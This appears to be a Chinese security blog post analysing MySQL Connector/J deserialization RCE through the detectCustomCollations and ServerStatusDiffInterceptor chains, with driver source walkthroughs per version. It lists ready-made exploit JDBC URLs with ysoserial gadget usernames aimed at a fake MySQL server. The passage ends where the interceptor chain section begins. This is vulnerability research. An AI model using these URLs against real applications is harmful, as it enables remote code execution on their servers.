# MYSQL JDBC反序列化解析 - 跳跳糖
JDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。  
Mysql JDBC 中包含一个危险的扩展参数： "autoDeserialize"。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。

若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。  
通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被ObjectInputStream.readObject()进行反序列化处理。如果攻击者可以控制JDBC连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞。  
可被利用的两条查询语句：

*   SHOW SESSION STATUS
*   SHOW COLLATION

[JDBC连接参数](#toc_jdbc_1)
-----------------------

*   tatementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。在 8.0 中被queryInterceptors参数替代。
*   queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query"之间"进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）
*   autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。
*   detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。

文档地址：[https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-connection.html](https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-connection.html#cj-conn-prop_detectCustomCollations)

[detectCustomCollations链](#toc_detectcustomcollations)
------------------------------------------------------

*   5.1.19-5.1.28：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso\_JRE8u20\_calc
*   5.1.29-5.1.48：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso\_JRE8u20\_calc
*   5.1.49：不可用
*   6.0.2-6.0.6：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso\_JRE8u20\_calc
*   8.x.x ：不可用

[ServerStatusDiffInterceptor链](#toc_serverstatusdiffinterceptor)
----------------------------------------------------------------

*   5.1.0-5.1.10：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso\_JRE8u20\_calc  连接后需执行查询
*   5.1.11-5.x.xx：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso\_JRE8u20\_calc
*   6.x：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso\_JRE8u20\_calc  （包名中添加cj）
*   8.0.20以下：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso\_JRE8u20\_calc

[1.detectCustomCollations链：](#toc_1detectcustomcollations)
----------------------------------------------------------

连接数据库

`//加载驱动
Class.forName("com.mysql.jdbc.Driver");
//用户连接信息
String url = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_CommonsCollections6_calc";
//连接数据库
Connection connection = DriverManager.getConnection(url);
connection.close();` 

调用DriverManager.getConnection(url);  
java.sql.DriverManager#getConnection()方法

`@CallerSensitive
    public static Connection getConnection(String url)
        throws SQLException {

        java.util.Properties info = new java.util.Properties();
        return (getConnection(url, info, Reflection.getCallerClass()));
    }` 

调用至此类getConnection()方法

`//  Worker method called by the public getConnection() methods.
private static Connection getConnection(
    String url, java.util.Properties info, Class<?> caller) throws SQLException {
    ...
    // Walk through the loaded registeredDrivers attempting to make a connection.
    // Remember the first exception that gets raised so we can reraise it.
    SQLException reason = null;

    for(DriverInfo aDriver : registeredDrivers) {
        // If the caller does not have permission to load the driver then
        // skip it.
        if(isDriverAllowed(aDriver.driver, callerCL)) {
            try {
                println("    trying " + aDriver.driver.getClass().getName());
                //调用至com.mysql.jdbc.NonRegisteringDriver#connect()方法
                Connection con = aDriver.driver.connect(url, info);
                if (con != null) {
                    // Success!
                    println("getConnection returning " + aDriver.driver.getClass().getName());
                    return (con);
                }
            } catch (SQLException ex) {
                if (reason == null) {
                    reason = ex;
                }
            }
    ...
}` 

com.mysql.jdbc.NonRegisteringDriver#connect()方法

 `public java.sql.Connection connect(String url, Properties info) throws SQLException {
        //url为数据库连接url，不为空进入
        if (url != null) {
            //url以jdbc:mysql:mxj:// 开头进入
            if (StringUtils.startsWithIgnoreCase(url, LOADBALANCE_URL_PREFIX)) {
                return connectLoadBalanced(url, info);
                ////url以jdbc:mysql:loadbalance:// 开头进入
            } else if (StringUtils.startsWithIgnoreCase(url, REPLICATION_URL_PREFIX)) {
                return connectReplicationConnection(url, info);
            }
        }

        Properties props = null;

        if ((props = parseURL(url, info)) == null) {
            return null;
        }

        if (!"1".equals(props.getProperty(NUM_HOSTS_PROPERTY_KEY))) {
            return connectFailover(url, info);
        }

        try {
            //进入
            Connection newConn = com.mysql.jdbc.ConnectionImpl.getInstance(host(props), port(props), props, database(props), url);

            return newConn;
        ...
    }` 

com.mysql.jdbc.ConnectionImpl#getInstance()方法

`protected static Connection getInstance(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url)
    throws SQLException {
    if (!Util.isJdbc4()) {
        return new ConnectionImpl(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);
    }

    return (Connection) Util.handleNewInstance(JDBC_4_CONNECTION_CTOR, new Object[] { hostToConnectTo, Integer.valueOf(portToConnectTo), info,
                                                                                     databaseToConnectTo, url }, null);
}` 

com.mysql.jdbc.Util#handleNewInstance()方法

`public static final Object handleNewInstance(Constructor<?> ctor, Object[] args, ExceptionInterceptor exceptionInterceptor) throws SQLException {
    try {
        //此次ctor为com.mysql.jdbc.JDBC4Connection
        return ctor.newInstance(args);
    } catch (IllegalArgumentException e) {
    ...
}` 

调用至com.mysql.jdbc.JDBC4Connection构造方法

`public JDBC4Connection(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url) throws SQLException {
    //调用父类构造方法  JDBC4Connection extends ConnectionImpl
    super(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);
}` 

调用至com.mysql.jdbc.ConnectionImpl构造方法

`public ConnectionImpl(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url) throws SQLException {
    ...
    try {
    this.dbmd = getMetaData(false, false);
    initializeSafeStatementInterceptors();
    //调用至createNewIO()方法
    createNewIO(false);
    unSafeStatementInterceptors();
    } catch (SQLException ex) {
    cleanup(ex);
    ...
}` 

调用至com.mysql.jdbc.ConnectionImpl#createNewIO()方法

`public void createNewIO(boolean isForReconnect) throws SQLException {
    synchronized (getConnectionMutex()) {
        // Synchronization Not needed for *new* connections, but defintely for connections going through fail-over, since we might get the new connection up
        // and running *enough* to start sending cached or still-open server-side prepared statements over to the backend before we get a chance to
        // re-prepare them...

        Properties mergedProps = exposeAsProperties(this.props);

        if (!getHighAvailability()) {
            connectOneTryOnly(isForReconnect, mergedProps);

            return;
        }

        connectWithRetries(isForReconnect, mergedProps);
    }
}` 

调用至com.mysql.jdbc.ConnectionImpl#connectWithRetries()方法

`private void connectWithRetries(boolean isForReconnect, Properties mergedProps) throws SQLException {
    ...
    for (int attemptCount = 0; (attemptCount < getMaxReconnects()) && !connectionGood; attemptCount++) {
        try {
            if (this.io != null) {
                this.io.forceClose();
            }

            coreConnect(mergedProps);
            pingInternal(false, 0);

            boolean oldAutoCommit;
            int oldIsolationLevel;
            boolean oldReadOnly;
            String oldCatalog;

            synchronized (getConnectionMutex()) {
                this.connectionId = this.io.getThreadId();
                this.isClosed = false;

                // save state from old connection
                oldAutoCommit = getAutoCommit();
                oldIsolationLevel = this.isolationLevel;
                oldReadOnly = isReadOnly(false);
                oldCatalog = getCatalog();

                this.io.setStatementInterceptors(this.statementInterceptors);
            }

            // Server properties might be different from previous connection, so initialize again...
            //进入initializePropsFromServer()方法
            initializePropsFromServer();

            if (isForReconnect) {
                // Restore state from old connection
                setAutoCommit(oldAutoCommit);

                if (this.hasIsolationLevels) {
                    setTransactionIsolation(oldIsolationLevel);
                }

                setCatalog(oldCatalog);
                setReadOnly(oldReadOnly);
            }

            connectionGood = true;

            break;
        ...` 

调用至com.mysql.jdbc.ConnectionImpl#initializePropsFromServer()方法调用至buildCollationMapping()

`private void initializePropsFromServer() throws SQLException {
    String connectionInterceptorClasses = getConnectionLifecycleInterceptors();
    ...
    //
    // If version is greater than 3.21.22 get the server variables.
    //服务器版本大于3.21.22进入
    if (versionMeetsMinimum(3, 21, 22)) {
        loadServerVariables();

        if (versionMeetsMinimum(5, 0, 2)) {
            this.autoIncrementIncrement = getServerVariableAsInt("auto_increment_increment", 1);
        } else {
            this.autoIncrementIncrement = 1;
        }

        buildCollationMapping();
        ...` 

调用链如下  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/27f63a56-420f-44bc-adef-604402f54f78.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/9238c5a7-3c63-4c58-b762-27822ab4aad3.png)

### [5.1.19以下](#toc_5119)

5.1.19以下未使用Util.resultSetToMap，此链不存在反序列化漏洞  
com.mysql.jdbc.ConnectionImpl#buildCollationMapping()方法（mysql-connector-java 5.1.18）

`private void buildCollationMapping() throws SQLException {
    if (this.versionMeetsMinimum(4, 1, 0)) {
    TreeMap sortedCollationMap = null;
    if (this.getCacheServerConfiguration()) {
        synchronized(serverConfigByUrl) {
            sortedCollationMap = (TreeMap)serverCollationByUrl.get(this.getURL());
        }
    }

    Statement stmt = null;
    ResultSet results = null;

    try {
        if (sortedCollationMap == null) {
            sortedCollationMap = new TreeMap();
            stmt = this.getMetadataSafeStatement();
            results = stmt.executeQuery("SHOW COLLATION");

            while(results.next()) {
                String charsetName = results.getString(2);
                Integer charsetIndex = results.getInt(3);
                sortedCollationMap.put(charsetIndex, charsetName);
            }

            if (this.getCacheServerConfiguration()) {
                synchronized(serverConfigByUrl) {
                    serverCollationByUrl.put(this.getURL(), sortedCollationMap);
                }
            }
        }

        int highestIndex = (Integer)sortedCollationMap.lastKey();
        if (CharsetMapping.INDEX_TO_CHARSET.length > highestIndex) {
            highestIndex = CharsetMapping.INDEX_TO_CHARSET.length;
        }

        this.indexToCharsetMapping = new String[highestIndex + 1];

        for(int i = 0; i < CharsetMapping.INDEX_TO_CHARSET.length; ++i) {
            this.indexToCharsetMapping[i] = CharsetMapping.INDEX_TO_CHARSET[i];
        }

        Entry indexEntry;
        String mysqlCharsetName;
        for(Iterator indexIter = sortedCollationMap.entrySet().iterator(); indexIter.hasNext(); this.indexToCharsetMapping[(Integer)indexEntry.getKey()] = CharsetMapping.getJavaEncodingForMysqlEncoding(mysqlCharsetName, this)) {
            indexEntry = (Entry)indexIter.next();
            mysqlCharsetName = (String)indexEntry.getValue();
        }
    } catch (SQLException var23) {
        throw var23;
    } finally {
        if (results != null) {
            try {
                results.close();
            } catch (SQLException var20) {
            }
        }

        if (stmt != null) {
            try {
                stmt.close();
            } catch (SQLException var19) {
            }
        }

    }
} else {
    this.indexToCharsetMapping = CharsetMapping.INDEX_TO_CHARSET;
}

}` 

### [5.1.19-5.1.28](#toc_5119-5128)

5.1.19-5.1.28版本只判断版本是否大于4.1.0，若大于则可直接利用。  
com.mysql.jdbc.ConnectionImpl#buildCollationMapping()方法（mysql-connector-java 5.1.28）

`private void buildCollationMapping() throws SQLException {
    HashMap<Integer, String> javaCharset = null;
    //判断服务版本小于于4.1.0
    if (!this.versionMeetsMinimum(4, 1, 0)) {
        javaCharset = new HashMap();

        for(int i = 0; i < CharsetMapping.INDEX_TO_CHARSET.length; ++i) {
            javaCharset.put(i, CharsetMapping.INDEX_TO_CHARSET[i]);
        }

        this.indexToJavaCharset = Collections.unmodifiableMap(javaCharset);
    //判断服务版本大于于4.1.0
    } else {
        TreeMap<Long, String> sortedCollationMap = null;
        HashMap<Integer, String> customCharset = null;
        HashMap<String, Integer> customMblen = null;
        if (this.getCacheServerConfiguration()) {
            synchronized(serverCollationByUrl) {
                sortedCollationMap = (TreeMap)serverCollationByUrl.get(this.getURL());
                javaCharset = (HashMap)serverJavaCharsetByUrl.get(this.getURL());
                customCharset = (HashMap)serverCustomCharsetByUrl.get(this.getURL());
                customMblen = (HashMap)serverCustomMblenByUrl.get(this.getURL());
            }
        }

        java.sql.Statement stmt = null;
        ResultSet results = null;

        try {
            if (sortedCollationMap == null) {
                sortedCollationMap = new TreeMap();
                javaCharset = new HashMap();
                customCharset = new HashMap();
                customMblen = new HashMap();
                stmt = this.getMetadataSafeStatement();

                try {
                    results = stmt.executeQuery("SHOW COLLATION");
                    //版本大于5.0.0进入
                    if (this.versionMeetsMinimum(5, 0, 0)) {
                        //反序列化触发点
                        Util.resultSetToMap(sortedCollationMap, results, 3, 2);
                    } else {
                        while(results.next()) {
                            sortedCollationMap.put(results.getLong(3), results.getString(2));
                        }
                    }
                } catch (SQLException var31) {
                    if (var31.getErrorCode() != 1820 || this.getDisconnectOnExpiredPasswords()) {
                        throw var31;
                    }
                }
                ...
}` 

#### [payload](#toc_payload)

`String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_CommonsCollections4_calc";
String username = "yso_CommonsCollections4_calc";
String password = "";
Class.forName("com.mysql.jdbc.Driver");
conn = DriverManager.getConnection(url,username,password);` 

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/1dbc0250-4f5a-4c32-aa48-6838381c4f5d.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/9ec5c79c-6b62-463c-bc75-88032d8a06fd.png)

### [5.1.29-5.1.40](#toc_5129-5140)

com.mysql.jdbc.ConnectionImpl#buildCollationMapping()方法（mysql-connector-java 5.1.35）

`private void buildCollationMapping() throws SQLException {
    ...
    if (indexToCharset == null) {
        indexToCharset = new HashMap();
        //判断服务版本大于4.1.0且detectCustomCollations为true则进入
        //5.1.28此处判断条件只有服务版本大于4.1.0
        if (this.versionMeetsMinimum(4, 1, 0) && this.getDetectCustomCollations()) {
            java.sql.Statement stmt = null;
            ResultSet results = null;

            try {
                sortedCollationMap = new TreeMap();
                customCharset = new HashMap();
                customMblen = new HashMap();
                stmt = this.getMetadataSafeStatement();

                try {
                    //执行"SHOW COLLATION" SQL语句
                    results = stmt.executeQuery("SHOW COLLATION");
                    //若服务版本大于5.0.0进入
                    if (this.versionMeetsMinimum(5, 0, 0)) {
                        //调用com.mysql.jdbc.Util#resultSetToMap()方法获取"SHOW COLLATION"语句执行结果
                        Util.resultSetToMap(sortedCollationMap, results, 3, 2);
                    } else {
                        while(results.next()) {
                            sortedCollationMap.put(results.getLong(3), results.getString(2));
                        }
                    }` 

com.mysql.jdbc.Util#resultSetToMap()方法（mysql-connector-java 5.1.35）

`public static void resultSetToMap(Map mappedValues, ResultSet rs, int key, int value) throws SQLException {
    while(rs.next()) {
        //调用ResultSetImpl#getObject()方法
        mappedValues.put(rs.getObject(key), rs.getObject(value));
    }

}` 

com.mysql.jdbc.ResultSetImpl#getObject()方法（mysql-connector-java 5.1.35）

`public Object getObject(int columnIndex) throws SQLException {
    checkRowPos();
    checkColumnBounds(columnIndex);

    int columnIndexMinusOne = columnIndex - 1;

    if (this.thisRow.isNull(columnIndexMinusOne)) {
        this.wasNullFlag = true;

        return null;
    }

    this.wasNullFlag = false;

    Field field;
    field = this.fields[columnIndexMinusOne];

    switch (field.getSQLType()) {
        case Types.BIT:
        case Types.BOOLEAN:
            if (field.getMysqlType() == MysqlDefs.FIELD_TYPE_BIT && !field.isSingleBit()) {
                return getBytes(columnIndex);
            }

            // valueOf would be nicer here, but it isn't present in JDK-1.3.1, which is what the CTS uses.
            return Boolean.valueOf(getBoolean(columnIndex));
            .......
        case Types.LONGVARCHAR:
            if (!field.isOpaqueBinary()) {
                return getStringForClob(columnIndex);
            }

            return getBytes(columnIndex);

        case Types.BINARY:
        case Types.VARBINARY:
            //判断数据是否为二进制数据，若为则进入case
        case Types.LONGVARBINARY:
            //判断是否为GEOMETRY类型数据
            if (field.getMysqlType() == MysqlDefs.FIELD_TYPE_GEOMETRY) {
                return getBytes(columnIndex);
                //判断数据是否为blob或者二进制数据
            } else if (field.isBinary() || field.isBlob()) {
                byte[] data = getBytes(columnIndex);

                if (this.connection.getAutoDeserialize()) {
                    Object obj = data;
                    //data不为空且大于2
                    if ((data != null) && (data.length >= 2)) {
                        //判断是否为java反序列化数据  -84 -19为java对象序列化数据魔术头
                        if ((data[0] == -84) && (data[1] == -19)) {
                            // Serialized object
                            //进行反序列化调用readObject()
                            try {
                                ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
                                ObjectInputStream objIn = new ObjectInputStream(bytesIn);
                                obj = objIn.readObject();
                                objIn.close();
                                bytesIn.close();
                            } catch (ClassNotFoundException cnfe) {
                                throw SQLError.createSQLException(
                                        Messages.getString("ResultSet.Class_not_found___91") + cnfe.toString()
                                                + Messages.getString("ResultSet._while_reading_serialized_object_92"), getExceptionInterceptor());
                            } catch (IOException ex) {
                                obj = data; // not serialized?
                            }
                        } else {
                            return getString(columnIndex);
                        }
                    }

                    return obj;
                }

                return data;
            }

            return getBytes(columnIndex);

        case Types.DATE:
            ......
    }
}` 

#### [payload](#toc_payload_1)

`String url = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_CommonsCollections4_calc";
String username = "yso_CommonsCollections4_calc";
String password = "";
Class.forName("com.mysql.jdbc.Driver");
conn = DriverManager.getConnection(url,username,password);` 

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/66b5c9a9-719f-45f7-8d1c-a9093afbfb22.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/45ed6f01-3cca-4643-afaa-334aade0b92e.png)

### [5.1.41-5.1.48](#toc_5141-5148)

com.mysql.jdbc.ConnectionImpl#buildCollationMapping()方法（（mysql-connector-java 5.1.41））  
5.1.41版本后，不再使用com.mysql.jdbc.Util#resultSetToMap()方法获取"SHOW COLLATION"的结果，但又直接调用了results.getObject(3)

`private void buildCollationMapping() throws SQLException {
    ...
    if (customCharset == null && this.getDetectCustomCollations() && this.versionMeetsMinimum(4, 1, 0)) {
        java.sql.Statement stmt = null;
        ResultSet results = null;

        try {
            customCharset = new HashMap();
            customMblen = new HashMap();
            stmt = this.getMetadataSafeStatement();

            try {
                results = stmt.executeQuery("SHOW COLLATION");

                while(results.next()) {
                    //直接调用getObject()
                    int collationIndex = ((Number)results.getObject(3)).intValue();
                    String charsetName = results.getString(2);
                    if (collationIndex >= 2048 || !charsetName.equals(CharsetMapping.getMysqlCharsetNameForCollationIndex(collationIndex))) {
                        ((Map)customCharset).put(collationIndex, charsetName);
                    }

                    if (!CharsetMapping.CHARSET_NAME_TO_CHARSET.containsKey(charsetName)) {
                        ((Map)customMblen).put(charsetName, (Object)null);
                    }
                }
            } catch (SQLException var27) {
                if (var27.getErrorCode() != 1820 || this.getDisconnectOnExpiredPasswords()) {
                    throw var27;
                }
            }

            if (((Map)customMblen).size() > 0) {
                try {
                    results = stmt.executeQuery("SHOW CHARACTER SET");

                    while(results.next()) {
                        String charsetName = results.getString("Charset");
                        if (((Map)customMblen).containsKey(charsetName)) {
                            ((Map)customMblen).put(charsetName, results.getInt("Maxlen"));
                        }
                    }
                } catch (SQLException var26) {
                    if (var26.getErrorCode() != 1820 || this.getDisconnectOnExpiredPasswords()) {
                        throw var26;
                    }
                }
            }
            ...
}` 

调用至com.mysql.jdbc.ResultSetImpl#getObject()方法（mysql-connector-java 5.1.41）

`public Object getObject(int columnIndex) throws SQLException {
    this.checkRowPos();
    this.checkColumnBounds(columnIndex);
    int columnIndexMinusOne = columnIndex - 1;
    if (this.thisRow.isNull(columnIndexMinusOne)) {
        this.wasNullFlag = true;
        return null;
    } else {
        this.wasNullFlag = false;
        Field field = this.fields[columnIndexMinusOne];
        String stringVal;
        switch (field.getSQLType()) {
            case -7:
            ...
            //为-4 -3 -2 进入getObjectDeserializingIfNeeded()方法
            case -4:
            case -3:
            case -2:
                if (field.getMysqlType() == 255) {
                    return this.getBytes(columnIndex);
                }

                return this.getObjectDeserializingIfNeeded(columnIndex);
            ....` 

调用至com.mysql.jdbc.ResultSetImpl#getObjectDeserializingIfNeeded()方法（mysql-connector-java 5.1.41） 直接执行

`private Object getObjectDeserializingIfNeeded(int columnIndex) throws SQLException {
    Field field = this.fields[columnIndex - 1];
    if (!field.isBinary() && !field.isBlob()) {
        return this.getBytes(columnIndex);
    } else {
        //为二进制数据进入else
        byte[] data = this.getBytes(columnIndex);
        //autoDeserialize=true
        if (!this.connection.getAutoDeserialize()) {
            return data;
        } else {
            Object obj = data;
            if (data != null && data.length >= 2) {
                //判断是否为java反序列化数据  -84 -19为java对象序列化数据魔术头
                if (data[0] != -84 || data[1] != -19) {
                    return this.getString(columnIndex);
                }
                //进行反序列化调用readObject()
                try {
                    ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
                    ObjectInputStream objIn = new ObjectInputStream(bytesIn);
                    obj = objIn.readObject();
                    objIn.close();
                    bytesIn.close();
                } catch (ClassNotFoundException var7) {
                    throw SQLError.createSQLException(Messages.getString("ResultSet.Class_not_found___91") + var7.toString() + Messages.getString("ResultSet._while_reading_serialized_object_92"), this.getExceptionInterceptor());
                } catch (IOException var8) {
                    obj = data;
                }
            }

            return obj;
        }
    }
}` 

#### [payload](#toc_payload_2)

`String url = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_CommonsCollections4_calc";
String username = "yso_CommonsCollections4_calc";
String password = "";
Class.forName("com.mysql.jdbc.Driver");
conn = DriverManager.getConnection(url,username,password);` 

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/1462a709-1af9-44cd-b6d4-2a9db43ebdd8.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/83a806c6-4464-4d31-9834-1e133a335e92.png)  
因为调用的是results.getObject(3)，故需修改MySQL\_Fake\_Server代码，server.py 147行，将传入数据第三列改为JAVA序列化字符串。  
[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/459d0245-2453-4b9d-9246-ab6b62ce95c0.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/1b411edf-582f-4e94-88a8-6d95c38af59f.png)

### [5.1.49](#toc_5149)

com.mysql.jdbc.ConnectionImpl#buildCollationMapping()方法（mysql-connector-java 5.1.49）  
5.1.49版本不再调用results.getObject()，此利用链失效

`private void buildCollationMapping() throws SQLException {
    ...
    if (customCharset == null && this.getDetectCustomCollations() && this.versionMeetsMinimum(4, 1, 0)) {
    java.sql.Statement stmt = null;
    ResultSet results = null;

    try {
        customCharset = new HashMap();
        customMblen = new HashMap();
        stmt = this.getMetadataSafeStatement();

        try {
            results = stmt.executeQuery("SHOW COLLATION");

            while(results.next()) {
                //不再调用getObject()
                int collationIndex = results.getInt(3);
                String charsetName = results.getString(2);
                if (collationIndex >= 2048 || !charsetName.equals(CharsetMapping.getMysqlCharsetNameForCollationIndex(collationIndex))) {
                    ((Map)customCharset).put(collationIndex, charsetName);
                }

                if (!CharsetMapping.CHARSET_NAME_TO_CHARSET.containsKey(charsetName)) {
                    ((Map)customMblen).put(charsetName, (Object)null);
                }
            }
            ...` 

### [6.0.2-6.0.6](#toc_602-606)

com.mysql.cj.jdbc.ConnectionImpl#buildCollationMapping()方法（mysql-connector-java 6.0.2）

`private void buildCollationMapping() throws SQLException {
    ...
    if (indexToCharset == null) {
        indexToCharset = new HashMap();
        if ((Boolean)this.getPropertySet().getBooleanReadableProperty("detectCustomCollations").getValue()) {
            java.sql.Statement stmt = null;
            ResultSet results = null;

            try {
                sortedCollationMap = new TreeMap();
                customCharset = new HashMap();
                customMblen = new HashMap();
                stmt = this.getMetadataSafeStatement();

                try {
                    results = stmt.executeQuery("SHOW COLLATION");
                    //调用resultSetToMap()最后调用至getObject()
                    ResultSetUtil.resultSetToMap(sortedCollationMap, results, 3, 2);
                } catch (PasswordExpiredException var36) {
                    if ((Boolean)this.disconnectOnExpiredPasswords.getValue()) {
                        throw var36;
                    }
                } catch (SQLException var37) {
                    if (var37.getErrorCode() != 1820 || (Boolean)this.disconnectOnExpiredPasswords.getValue()) {
                        throw var37;
                    }
                }
                ...` 

调用com.mysql.cj.jdbc.util.ResultSetUtil.resultSetToMap()

`public static void resultSetToMap(Map mappedValues, ResultSet rs, int key, int value) throws SQLException {
    while(rs.next()) {
        mappedValues.put(rs.getObject(key), rs.getObject(value));
    }

}` 

调用getObject()，最后调用至readObject()

#### [payload](#toc_payload_3)

`String url = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_CommonsCollections4_calc";
String username = "yso_CommonsCollections4_calc";
String password = "";
Class.forName("com.mysql.jdbc.Driver");
conn = DriverManager.getConnection(url,username,password);` 

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/2/12a8e801-dec7-4d15-9ccf-d858a7bd0270.png?raw=true)
](https://storage.tttang.com/media/attachment/2022/12/30/6a8f61b6-e142-411a-a6cd-e7ac9610c8fc.png)

### [8.x.x 以上](#toc_8xx)

mysql-connector-java 8.0以上不再在com.mysql.cj.jdbc.ConnectionImpl中直接执行及获取"SHOW COLLATION"语句，调用链更改，不再调用getObject()方法，此链失效  
com.mysql.cj.jdbc.ConnectionImpl#initializePropsFromServer()方法

`private void initializePropsFromServer() throws SQLException {
    String connectionInterceptorClasses = this.getPropertySet().getStringReadableProperty("connectionLifecycleInterceptors").getStringValue();
    this.connectionLifecycleInterceptors = null;
    if (connectionInterceptorClasses != null) {
        try {
            this.connectionLifecycleInterceptors = (List)Util.loadClasses(this.getPropertySet().getStringReadableProperty("connectionLifecycleInterceptors").getStringValue(), "Connection.badLifecycleInterceptor", this.getExceptionInterceptor()).stream().map((o) -> {
                return o.init(this, this.props, this.session.getLog());
            }).collect(Collectors.toList());
        } catch (CJException var8) {
            throw SQLExceptionsMapping.translateException(var8, this.getExceptionInterceptor());
        }
    }

    this.session.setSessionVariables();
    if ((Boolean)this.useServerPrepStmts.getValue()) {
        this.useServerPreparedStmts = true;
    }

    this.session.loadServerVariables(this.getConnectionMutex(), this.dbmd.getDriverVersion());
    this.autoIncrementIncrement = this.session.getServerVariable("auto_increment_increment", 1);
    //调用buildCollationMapping()方法
    this.session.buildCollationMapping();

    try {
        LicenseConfiguration.checkLicenseType(this.session.getServerVariables());
    } catch (CJException var7) {
        throw SQLError.createSQLException(var7.getMessage(), "08001", this.getExceptionInterceptor());
    }` 

com.mysql.cj.mysqla.MysqlaSession#buildCollationMapping()方法

`public void buildCollationMapping() {
    Map<Integer, String> customCharset = null;
    Map<String, Integer> customMblen = null;
    String databaseURL = this.hostInfo.getDatabaseUrl();
    if ((Boolean)this.cacheServerConfiguration.getValue()) {
        synchronized(customIndexToCharsetMapByUrl) {
            customCharset = (Map)customIndexToCharsetMapByUrl.get(databaseURL);
            customMblen = (Map)customCharsetToMblenMapByUrl.get(databaseURL);
        }
    }

    if (customCharset == null && (Boolean)this.getPropertySet().getBooleanReadableProperty("detectCustomCollations").getValue()) {
        customCharset = new HashMap();
        customMblen = new HashMap();
        ValueFactory<Integer> ivf = new IntegerValueFactory();

        PacketPayload resultPacket;
        Resultset rs;
        try {
            //此处不再调用getObject()方法，此链失效
            resultPacket = this.sendCommand(this.commandBuilder.buildComQuery(this.getSharedSendPacket(), "SHOW COLLATION"), false, 0);
            rs = this.protocol.readAllResults(-1, false, resultPacket, false, (ColumnDefinition)null, new ResultsetFactory(Type.FORWARD_ONLY, (Resultset.Concurrency)null));
            ValueFactory<String> svf = new StringValueFactory(rs.getColumnDefinition().getFields()[1].getEncoding());

            Row r;
            while((r = (Row)rs.getRows().next()) != null) {
                int collationIndex = ((Number)r.getValue(2, ivf)).intValue();
                String charsetName = (String)r.getValue(1, svf);
                if (collationIndex >= 2048 || !charsetName.equals(CharsetMapping.getMysqlCharsetNameForCollationIndex(collationIndex))) {
                    ((Map)customCharset).put(collationIndex, charsetName);
                }

                if (!CharsetMapping.CHARSET_NAME_TO_CHARSET.containsKey(charsetName)) {
                    ((Map)customMblen).put(charsetName, (Object)null);
                }
            }
        } catch (PasswordExpiredException var17) {
            if ((Boolean)this.disconnectOnExpiredPasswords.getValue()) {
                throw var17;
            }
        } catch (IOException var18) {
            throw ExceptionFactory.createException(var18.getMessage(), var18, this.exceptionInterceptor);
        }` 

[2.ServerStatusDiffInterceptor链](#toc_2serverstatusdiffinterceptor)
-------------------------------------------------------------------

ServerStatusDiffInterceptor是一个拦截器，在JDBC URL中设置属性queryInterceptors(8.0以下为statementInterceptors)为ServerStatusDiffInterceptor时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法，进而调用 getObject () 方法。  
连接数据库:

